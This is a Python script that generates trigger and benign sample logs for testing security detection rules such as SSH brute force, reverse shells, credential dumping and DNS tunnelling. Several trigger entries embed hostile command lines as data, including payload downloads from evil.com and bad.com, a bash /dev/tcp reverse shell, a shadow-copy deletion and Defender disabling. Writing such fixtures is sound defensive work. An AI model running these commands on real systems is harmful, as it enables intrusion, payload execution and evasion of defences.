import os

# Base directory for tests
base_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "sample-logs"))

# Define the log sets for all rules
log_definitions = {
    "de-cm-01/ssh-bruteforce": {
        "trigger": "Dec 10 14:23:01 webserver01 sshd[12458]: Failed password for root from 192.168.1.105 port 54821 ssh2\n"
                   "Dec 10 14:23:03 webserver01 sshd[12459]: Failed password for root from 192.168.1.105 port 54822 ssh2\n"
                   "Dec 10 14:23:05 webserver01 sshd[12460]: Failed password for root from 192.168.1.105 port 54823 ssh2\n"
                   "Dec 10 14:23:07 webserver01 sshd[12461]: Failed password for root from 192.168.1.105 port 54824 ssh2\n"
                   "Dec 10 14:23:09 webserver01 sshd[12462]: Failed password for root from 192.168.1.105 port 54825 ssh2\n",
        "benign": "Dec 10 14:23:01 webserver01 sshd[12458]: Accepted password for jsmith from 192.168.1.105 port 54821 ssh2\n"
    },
    "pr-aa-05/sudo-privilege-escalation": {
        "trigger": "Dec 10 14:24:00 webserver01 sudo:   subhash : TTY=pts/0 ; PWD=/home/subhash ; USER=root ; COMMAND=/bin/bash\n",
        "benign": "Dec 10 14:24:00 webserver01 sudo:   subhash : TTY=pts/0 ; PWD=/home/subhash ; USER=subhash ; COMMAND=/usr/bin/whoami\n"
    },
    "pr-aa-01/new-user-account": {
        "trigger": "Dec 10 14:25:01 webserver01 useradd[13000]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash\n",
        "benign": "Dec 10 14:25:01 webserver01 systemd[1]: Started Periodic Command Scheduler.\n"
    },
    "de-cm-09/cron-modification": {
        "trigger": "type=SYSCALL msg=audit(1779953100.123:456): path=/etc/cron.d/malicious-job perm=wa\n",
        "benign": "type=SYSCALL msg=audit(1779953100.123:456): path=/var/log/nginx/access.log perm=r\n"
    },
    "de-cm-01/outbound-rare-port": {
        "trigger": "Dec 10 14:26:01 firewall kernel: [12345.678] OUTBOUND-BLOCK: IN= OUT=eth0 SRC=192.168.1.100 DST=8.8.8.8 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=4444 WINDOW=65535 RES=0x00 SYN URGP=0\n",
        "benign": "Dec 10 14:26:01 firewall kernel: [12345.678] OUTBOUND-BLOCK: IN= OUT=eth0 SRC=192.168.1.100 DST=8.8.8.8 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0\n"
    },
    "pr-ds-01/passwd-shadow-read": {
        "trigger": "type=SYSCALL msg=audit(1779953200.123:457): path=/etc/shadow perm=r\n",
        "benign": "type=SYSCALL msg=audit(1779953200.123:457): path=/etc/services perm=r\n"
    },
    "de-ae-02/web-shell-indicators": {
        "trigger": "192.168.1.105 - - [10/Dec/2026:14:27:01 +0000] \"GET /index.php?cmd=whoami HTTP/1.1\" 200 456\n",
        "benign": "192.168.1.105 - - [10/Dec/2026:14:27:01 +0000] \"GET /index.php?page=home HTTP/1.1\" 200 123\n"
    },
    "de-ae-03/large-file-exfiltration": {
        "trigger": "Dec 10 14:28:01 webserver01 proxy: method=POST url=https://evil-exfil.com/upload bytes=150000000\n",
        "benign": "Dec 10 14:28:01 webserver01 proxy: method=POST url=https://google.com/search bytes=1500\n"
    },
    "de-cm-09/windows-audit-cleared": {
        "trigger": '{"win":{"system":{"eventID":"1102","channel":"Security"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","channel":"Security"}}}\n'
    },
    "de-cm-01/psexec-lateral-movement": {
        "trigger": '{"win":{"system":{"eventID":"7045","providerName":"Service Control Manager"},"eventdata":{"serviceName":"PSEXESVC"}}}\n',
        "benign": '{"win":{"system":{"eventID":"7045","providerName":"Service Control Manager"},"eventdata":{"serviceName":"BenignService"}}}\n'
    },
    "de-ae-02/repeated-auth-failures": {
        "trigger": '{"win":{"system":{"eventID":"4625"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n'
                   '{"win":{"system":{"eventID":"4625"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n'
                   '{"win":{"system":{"eventID":"4625"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n'
                   '{"win":{"system":{"eventID":"4625"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n'
                   '{"win":{"system":{"eventID":"4625"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624"},"eventdata":{"logonType":"3","ipAddress":"192.168.1.105"}}}\n'
    },
    "rs-an-08/process-injection": {
        "trigger": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"8"}}}\n',
        "benign": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"1"}}}\n'
    },
    "id-ra-03/dns-c2-domain": {
        "trigger": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"22"},"eventdata":{"queryName":"example-c2.bad"}}}\n',
        "benign": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon","eventID":"22"},"eventdata":{"queryName":"google.com"}}}\n'
    },
    "pr-ds-01/sensitive-permission-change": {
        "trigger": 'type=SYSCALL msg=audit(1779953300.123:458): path=/etc/nginx/nginx.conf comm="chmod"\n',
        "benign": 'type=SYSCALL msg=audit(1779953300.123:458): path=/home/subhash/doc.txt comm="nano"\n'
    },
    "de-cm-09/after-hours-service-install": {
        "trigger": '{"win":{"system":{"eventID":"7045","providerName":"Service Control Manager"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Service Control Manager"}}}\n'
    },
    "pr-ds-01/passwd-modification": {
        "trigger": 'type=SYSCALL msg=audit(1779953400.123:459): path=/etc/passwd perm=w\n',
        "benign": 'type=SYSCALL msg=audit(1779953400.123:459): path=/etc/passwd perm=r\n'
    },
    "pr-ds-01/shadow-modification": {
        "trigger": 'type=SYSCALL msg=audit(1779953401.123:460): path=/etc/shadow perm=w\n',
        "benign": 'type=SYSCALL msg=audit(1779953401.123:460): path=/etc/shadow perm=r\n'
    },
    "pr-aa-05/authorized-keys-modification": {
        "trigger": 'type=SYSCALL msg=audit(1779953402.123:461): path=/root/.ssh/authorized_keys perm=wa\n',
        "benign": 'type=SYSCALL msg=audit(1779953402.123:461): path=/root/.ssh/known_hosts perm=r\n'
    },
    "pr-aa-05/suid-sgid-set": {
        "trigger": 'type=SYSCALL msg=audit(1779953403.123:462): key="perm_mod" mode=04755 a2=4755\n',
        "benign": 'type=SYSCALL msg=audit(1779953403.123:462): key="perm_mod" mode=0755 a2=755\n'
    },
    "de-cm-09/kernel-module-loaded": {
        "trigger": "Dec 10 14:30:00 webserver01 sudo:   subhash : TTY=pts/0 ; PWD=/home/subhash ; USER=root ; COMMAND=/sbin/modprobe evil_rootkit\n",
        "benign": "Dec 10 14:30:00 webserver01 sudo:   subhash : TTY=pts/0 ; PWD=/home/subhash ; USER=root ; COMMAND=/bin/ls /sbin/modprobe\n"
    },
    "de-cm-09/log-file-deleted": {
        "trigger": 'type=SYSCALL msg=audit(1779953404.123:463): exe="rm" name="/var/log/auth.log"\n',
        "benign": 'type=SYSCALL msg=audit(1779953404.123:463): exe="ls" name="/var/log/auth.log"\n'
    },
    "de-ae-02/execution-from-tmp": {
        "trigger": 'type=SYSCALL msg=audit(1779953405.123:464): exe="/tmp/malware.sh"\n',
        "benign": 'type=SYSCALL msg=audit(1779953405.123:464): exe="/usr/bin/python3"\n'
    },
    "de-cm-09/root-crontab-modification": {
        "trigger": 'type=SYSCALL msg=audit(1779953406.123:465): path=/etc/crontab perm=w\n',
        "benign": 'type=SYSCALL msg=audit(1779953406.123:465): path=/var/spool/cron/crontabs/subhash perm=w\n'
    },
    "de-ae-04/sysmon-event-log-cleared": {
        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
    },
    "de-ae-04/windows-defender-tampering": {
        "trigger": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon", "eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
        "benign": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon", "eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
    },
    "de-ae-04/execution-from-recycle-bin": {
        "trigger": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon", "eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}\n',
        "benign": '{"win":{"system":{"providerName":"Microsoft-Windows-Sysmon", "eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}\n'
    }
    ,"de-ae-02/powershell-encoded": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Get-Process"}}}\n'
    },
    "de-ae-02/powershell-download": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe (New-Object Net.WebClient).DownloadString(\'http://bad.com/payload\')"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"powershell.exe Write-Host"}}}\n'
    },
    "de-ae-02/schtasks-create": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /create /tn \\"malicious\\" /tr \\"cmd.exe\\" /sc onstart"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"schtasks.exe /query"}}}\n'
    },
    "de-ae-02/registry-run": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\malware"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\legit"}}}\n'
    },
    "de-ae-02/vssadmin-delete": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin delete shadows /all /quiet"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"vssadmin list shadows"}}}\n'
    },
    "pr-aa-01/new-admin": {
        "trigger": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Domain Admins"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4732","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Standard Users"}}}\n'
    },
    "pr-aa-05/rdp-port-change": {
        "trigger": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\PortNumber"}}}\n',
        "benign": '{"win":{"system":{"eventID":"13","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\LegitKey"}}}\n'
    },
    "de-ae-02/wmi-event": {
        "trigger": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Created","filterName":"__EventFilter"}}}\n',
        "benign": '{"win":{"system":{"eventID":"19","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"eventType":"WmiFilterEvent","operation":"Deleted","filterName":"NormalFilter"}}}\n'
    },
    "de-ae-02/lsass-access": {
        "trigger": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1010"}}}\n',
        "benign": '{"win":{"system":{"eventID":"10","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"targetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","grantedAccess":"0x1400"}}}\n'
    },
    "de-ae-02/mimikatz": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"mimikatz.exe privilege::debug"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"ping 8.8.8.8"}}}\n'
    },
    "de-cm-01/pass-the-hash": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"9","logonProcessName":"seclogo","authenticationPackageName":"Negotiate"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"logonType":"3","logonProcessName":"NtLmSsp","authenticationPackageName":"NTLM"}}}\n'
    },
    "id-ra-03/dcsync": {
        "trigger": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","accessMask":"0x100"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4662","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"properties":"normal-guid","accessMask":"0x0"}}}\n'
    },
    "id-ra-03/kerberoasting": {
        "trigger": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x17"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4769","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x18"}}}\n'
    },
    "de-ae-02/lockouts": {
        "trigger": '{"win":{"system":{"eventID":"4740","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'*8,
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"ipAddress":"10.0.0.5"}}}\n'
    },
    "pr-aa-05/linux-shadow": {
        "trigger": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=1000 exe="/bin/cat"\n',
        "benign": 'type=SYSCALL msg=audit(1779953406.123:466): path=/etc/shadow uid=0 exe="/usr/bin/passwd"\n'
    },
    "de-ae-02/reverse-shell": {
        "trigger": 'type=SYSCALL msg=audit(1779953407.123:467): arch=c000003e syscall=59 success=yes exe="/bin/bash" a0="bash" a1="-c" a2="exec /dev/tcp/192.168.1.105/4444 0>&1" key="exec"\n',
        "benign": 'type=SYSCALL msg=audit(1779953407.123:467): arch=c000003e syscall=59 success=yes exe="/bin/bash" a0="bash" a1="script.sh" key="exec"\n'
    },
    "de-ae-02/base64-cmd": {
        "trigger": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 -d dGhpcyBpcyBhIHZlcnkgbG9uZyBzdHJpbmcgZm9yIGJhc2U2NA=="\n',
        "benign": 'type=SYSCALL msg=audit(1779953408.123:468): exe="base64 file.txt"\n'
    },
    "de-ae-03/dns-tunnel": {
        "trigger": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com"}}}\n',
        "benign": '{"win":{"system":{"eventID":"22","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"queryName":"google.com"}}}\n'
    },
    "de-ae-03/tor-exit": {
        "trigger": 'Dec 10 14:26:01 firewall kernel: [12345.678] OUTBOUND-BLOCK: IN= OUT=eth0 SRC=192.168.1.100 DST=known_tor_node LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0\n',
        "benign": 'Dec 10 14:26:01 firewall kernel: [12345.678] OUTBOUND-BLOCK: IN= OUT=eth0 SRC=192.168.1.100 DST=8.8.8.8 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=54321 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0\n'
    },
    "de-ae-02/beaconing": {
        "trigger": '{"win":{"system":{"eventID":"3","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n'*20,
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"notepad.exe","destinationIsIpv6":"false"}}}\n'
    },
    "de-ae-02/certutil": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -urlcache -split -f http://evil.com/payload"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"certutil.exe -hashfile"}}}\n'
    },
    "de-ae-02/regsvr32": {
        "trigger": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll"}}}\n',
        "benign": '{"win":{"system":{"eventID":"1","providerName":"Microsoft-Windows-Sysmon"},"eventdata":{"commandLine":"regsvr32.exe legit.dll"}}}\n'
    },
    "gv-po-01/admin-hours": {
        "trigger": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Administrator"}}}\n',
        "benign": '{"win":{"system":{"eventID":"4624","providerName":"Microsoft-Windows-Security-Auditing"},"eventdata":{"targetUserName":"Guest"}}}\n'
    },
    "rc-rp-01/backup-fail": {
        "trigger": 'Dec 10 14:30:00 server syslog: windows backup error terminated unexpectedly\n',
        "benign": 'Dec 10 14:30:00 server syslog: windows backup completed successfully\n'
    }
}

# Write files
for rel_path, logs in log_definitions.items():
    folder = os.path.join(base_dir, *rel_path.split("/"))
    os.makedirs(folder, exist_ok=True)
    
    # Write trigger.log
    with open(os.path.join(folder, "trigger.log"), "w", encoding="utf-8") as f:
        f.write(logs["trigger"])
        
    # Write benign.log
    with open(os.path.join(folder, "benign.log"), "w", encoding="utf-8") as f:
        f.write(logs["benign"])

print("Successfully generated all sample log files!")
